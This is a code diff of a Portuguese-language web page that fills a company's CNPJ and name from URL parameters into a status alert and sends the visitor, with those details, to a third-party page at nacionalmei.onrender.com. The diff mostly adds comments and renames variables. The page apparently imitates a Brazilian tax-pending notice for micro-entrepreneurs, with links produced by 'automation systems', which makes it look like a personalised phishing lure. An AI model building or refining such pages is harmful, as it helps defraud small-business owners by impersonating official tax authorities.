@@ -102,10 +102,6 @@
             align-items: flex-start;
         }
 
-        .status-alert i {
-            font-size: 24px;
-        }
-
         .status-alert-content h2 {
             font-size: 1rem;
             color: #663c00;
@@ -403,23 +399,34 @@
     <script>
         function clean(val) {
             if (!val) return "";
+            // Remove colchetes, aspas e espaços extras que podem vir de sistemas de automação
             return val.replace(/[\[\]"']/g, "").trim();
         }
 
         window.onload = function() {
+            // Captura os parâmetros da URL
             const params = new URLSearchParams(window.location.search);
-            const cnpj = clean(params.get('cnpj')) || "Não identificado";
-            const empresa = clean(params.get('empresa')) || "Contribuinte não identificado";
+            
+            // Pega o CNPJ e a Empresa da URL
+            const cnpjRaw = params.get('cnpj');
+            const empresaRaw = params.get('empresa');
+
+            // Limpa e exibe os dados
+            const cnpj = clean(cnpjRaw) || "Não identificado";
+            const empresa = clean(empresaRaw) || "Contribuinte não identificado";
 
             document.getElementById('cnpj').textContent = cnpj;
             document.getElementById('empresa').textContent = empresa;
 
+            // Configura o link do botão para redirecionar mantendo os dados
             const btn = document.getElementById('main-btn');
-            const target = "https://nacionalmei.onrender.com/PEND/";
+            const targetBase = "https://nacionalmei.onrender.com/PEND/";
 
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                window.location.href = `${target}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
+                // Constrói a URL final conforme o formato solicitado
+                const finalUrl = `${targetBase}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
+                window.location.href = finalUrl;
             });
         };
     </script>
